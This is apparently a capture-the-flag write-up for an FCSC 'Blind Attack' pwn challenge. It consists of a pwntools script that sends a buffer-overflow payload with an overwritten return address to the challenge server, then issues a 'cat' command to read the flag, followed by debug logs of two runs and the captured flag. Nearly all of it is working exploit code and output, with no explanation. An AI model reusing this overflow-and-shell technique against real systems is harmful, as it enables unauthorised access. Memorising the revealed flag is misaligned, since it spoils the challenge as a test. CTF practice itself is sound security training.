# pwn
## Blind Attack
### Intro

```python
#!/usr/bin/env python3

from pwn import *

#Set logging level
context.log_level = "DEBUG"  # or INFO, WARNING, ERROR

# Load environment variables
HOST = "challenges.france-cybersecurity-challenge.fr"
PORT = 2111

# Connect to remote and run the actual exploit
# Timeout is important to prevent stall
r = remote(HOST, PORT, typ="tcp", timeout=2)

# FIXME: You should identify if a flag_id was used in the following
# payload. If it is the case, then you should loop using EXTRA.
# for flag_id in EXTRA:
data = r.recvuntil(b'e note summary.\n')
r.sendline(b'n')
data = r.recvuntil(b'SSWAC\nContent: \n')
r.sendline(b'a8oTfj5GX9YOdweXqIl0JGjJwQoohq9wWcwIZ3ERf8b00G25PsG16Rc5InsmoxnH1nvt05SviZv9nNX3Wy5jDVQ3FAfMRJPxAJBG70uZ900oepYjWIvUyjcAThBz9oiJG36EAdoQOiU3g0wwa54o3ROm1hyAbLlz3c0RPLBQrC4OdoR1Bixndm8XkJlcNqWN88eKRa5oKEcSYCr4VAXryvOVaQufHqgaTt4b1zAp\xe5\x16@\x00\x00\x00\x00\x00')
r.sendline(b'cat /fcsc/ddJ565eGcAPFVkHZZFqXtrYe2vmVUQv/*')
data = r.recvuntil(b'ca8f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n')

# Use the following to capture all remaining bytes:
data = r.recvall(timeout=5)
print(data)

r.close()
```

```shell
┌──(kali㉿kali)-[~]
└─$ python3 ./test.py
[+] Opening connection to challenges.france-cybersecurity-challenge.fr on port 2111: Done
[DEBUG] Received 0x25 bytes:
    b'[n]ew note.\n'
    b'[r]etrieve note summary.\n'
[DEBUG] Sent 0x2 bytes:
    b'n\n'
[DEBUG] Received 0x65 bytes:
    b'[*] Current session: /fcsc/u7FgQ9Aq4RkgpUQZxJGNXhry3Z3DwSm/Q8xhGDvdsenBTr29AmRp2wct72xuYwC\n'
    b'Content: \n'
[DEBUG] Sent 0xf1 bytes:
    00000000  61 38 6f 54  66 6a 35 47  58 39 59 4f  64 77 65 58  │a8oT│fj5G│X9YO│dweX│
    00000010  71 49 6c 30  4a 47 6a 4a  77 51 6f 6f  68 71 39 77  │qIl0│JGjJ│wQoo│hq9w│
    00000020  57 63 77 49  5a 33 45 52  66 38 62 30  30 47 32 35  │WcwI│Z3ER│f8b0│0G25│
    00000030  50 73 47 31  36 52 63 35  49 6e 73 6d  6f 78 6e 48  │PsG1│6Rc5│Insm│oxnH│
    00000040  31 6e 76 74  30 35 53 76  69 5a 76 39  6e 4e 58 33  │1nvt│05Sv│iZv9│nNX3│
    00000050  57 79 35 6a  44 56 51 33  46 41 66 4d  52 4a 50 78  │Wy5j│DVQ3│FAfM│RJPx│
    00000060  41 4a 42 47  37 30 75 5a  39 30 30 6f  65 70 59 6a  │AJBG│70uZ│900o│epYj│
    00000070  57 49 76 55  79 6a 63 41  54 68 42 7a  39 6f 69 4a  │WIvU│yjcA│ThBz│9oiJ│
    00000080  47 33 36 45  41 64 6f 51  4f 69 55 33  67 30 77 77  │G36E│AdoQ│OiU3│g0ww│
    00000090  61 35 34 6f  33 52 4f 6d  31 68 79 41  62 4c 6c 7a  │a54o│3ROm│1hyA│bLlz│
    000000a0  33 63 30 52  50 4c 42 51  72 43 34 4f  64 6f 52 31  │3c0R│PLBQ│rC4O│doR1│
    000000b0  42 69 78 6e  64 6d 38 58  6b 4a 6c 63  4e 71 57 4e  │Bixn│dm8X│kJlc│NqWN│
    000000c0  38 38 65 4b  52 61 35 6f  4b 45 63 53  59 43 72 34  │88eK│Ra5o│KEcS│YCr4│
    000000d0  56 41 58 72  79 76 4f 56  61 51 75 66  48 71 67 61  │VAXr│yvOV│aQuf│Hqga│
    000000e0  54 74 34 62  31 7a 41 70  e5 16 40 00  00 00 00 00  │Tt4b│1zAp│··@·│····│
    000000f0  0a                                                  │·│
    000000f1
[DEBUG] Sent 0x2c bytes:
    b'cat /fcsc/ddJ565eGcAPFVkHZZFqXtrYe2vmVUQv/*\n'
[DEBUG] Received 0x46 bytes:
    00000000  46 43 53 43  5f 34 37 64  35 62 61 31  35 37 34 62  │FCSC│_47d│5ba1│574b│
    00000010  65 31 31 65  63 62 62 66  64 63 66 61  63 35 38 66  │e11e│cbbf│dcfa│c58f│
    00000020  61 38 65 38  64 63 63 38  66 30 31 30  38 39 34 66  │a8e8│dcc8│f010│894f│
    00000030  37 39 62 38  36 31 35 65  34 64 37 34  36 62 63 38  │79b8│615e│4d74│6bc8│
    00000040  35 37 64 38  30 00                                  │57d8│0·│
    00000046
[+] Receiving all data: Done (171B)
[*] Closed connection to challenges.france-cybersecurity-challenge.fr port 2111
b'[*] Current session: /fcsc/u7FgQ9Aq4RkgpUQZxJGNXhry3Z3DwSm/Q8xhGDvdsenBTr29AmRp2wct72xuYwC\nContent: \nFCSC_47d5ba1574be11ecbbfdcfac58fa8e8dcc8f010894f79b8615e4d746bc857d80\x00'
                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ python3 ./test.py
[+] Opening connection to challenges.france-cybersecurity-challenge.fr on port 2111: Done
[DEBUG] Received 0xb bytes:
    b'[n]ew note.'
[DEBUG] Received 0x1a bytes:
    b'\n'
    b'[r]etrieve note summary.\n'
[DEBUG] Sent 0x2 bytes:
    b'n\n'
[DEBUG] Received 0x65 bytes:
    b'[*] Current session: /fcsc/KmuxUBKeCPmPsZ3VSkqBrd78xQ4qnyY/p7KQYttfzZ2HaWT9H3gWX2fwZVNM59k\n'
    b'Content: \n'
[DEBUG] Sent 0xf1 bytes:
    00000000  61 38 6f 54  66 6a 35 47  58 39 59 4f  64 77 65 58  │a8oT│fj5G│X9YO│dweX│
    00000010  71 49 6c 30  4a 47 6a 4a  77 51 6f 6f  68 71 39 77  │qIl0│JGjJ│wQoo│hq9w│
    00000020  57 63 77 49  5a 33 45 52  66 38 62 30  30 47 32 35  │WcwI│Z3ER│f8b0│0G25│
    00000030  50 73 47 31  36 52 63 35  49 6e 73 6d  6f 78 6e 48  │PsG1│6Rc5│Insm│oxnH│
    00000040  31 6e 76 74  30 35 53 76  69 5a 76 39  6e 4e 58 33  │1nvt│05Sv│iZv9│nNX3│
    00000050  57 79 35 6a  44 56 51 33  46 41 66 4d  52 4a 50 78  │Wy5j│DVQ3│FAfM│RJPx│
    00000060  41 4a 42 47  37 30 75 5a  39 30 30 6f  65 70 59 6a  │AJBG│70uZ│900o│epYj│
    00000070  57 49 76 55  79 6a 63 41  54 68 42 7a  39 6f 69 4a  │WIvU│yjcA│ThBz│9oiJ│
    00000080  47 33 36 45  41 64 6f 51  4f 69 55 33  67 30 77 77  │G36E│AdoQ│OiU3│g0ww│
    00000090  61 35 34 6f  33 52 4f 6d  31 68 79 41  62 4c 6c 7a  │a54o│3ROm│1hyA│bLlz│
    000000a0  33 63 30 52  50 4c 42 51  72 43 34 4f  64 6f 52 31  │3c0R│PLBQ│rC4O│doR1│
    000000b0  42 69 78 6e  64 6d 38 58  6b 4a 6c 63  4e 71 57 4e  │Bixn│dm8X│kJlc│NqWN│
    000000c0  38 38 65 4b  52 61 35 6f  4b 45 63 53  59 43 72 34  │88eK│Ra5o│KEcS│YCr4│
    000000d0  56 41 58 72  79 76 4f 56  61 51 75 66  48 71 67 61  │VAXr│yvOV│aQuf│Hqga│
    000000e0  54 74 34 62  31 7a 41 70  e5 16 40 00  00 00 00 00  │Tt4b│1zAp│··@·│····│
    000000f0  0a                                                  │·│
    000000f1
[DEBUG] Sent 0x2c bytes:
    b'cat /fcsc/ddJ565eGcAPFVkHZZFqXtrYe2vmVUQv/*\n'
[DEBUG] Received 0x46 bytes:
    00000000  46 43 53 43  5f 34 37 64  35 62 61 31  35 37 34 62  │FCSC│_47d│5ba1│574b│
    00000010  65 31 31 65  63 62 62 66  64 63 66 61  63 35 38 66  │e11e│cbbf│dcfa│c58f│
    00000020  61 38 65 38  64 63 63 38  66 30 31 30  38 39 34 66  │a8e8│dcc8│f010│894f│
    00000030  37 39 62 38  36 31 35 65  34 64 37 34  36 62 63 38  │79b8│615e│4d74│6bc8│
    00000040  35 37 64 38  30 00                                  │57d8│0·│
    00000046
[+] Receiving all data: Done (171B)
[*] Closed connection to challenges.france-cybersecurity-challenge.fr port 2111
b'[*] Current session: /fcsc/KmuxUBKeCPmPsZ3VSkqBrd78xQ4qnyY/p7KQYttfzZ2HaWT9H3gWX2fwZVNM59k\nContent: \nFCSC_47d5ba1574be11ecbbfdcfac58fa8e8dcc8f010894f79b8615e4d746bc857d80\x00'
```

**FCSC_47d5ba1574be11ecbbfdcfac58fa8e8dcc8f010894f79b8615e4d746bc857d80**
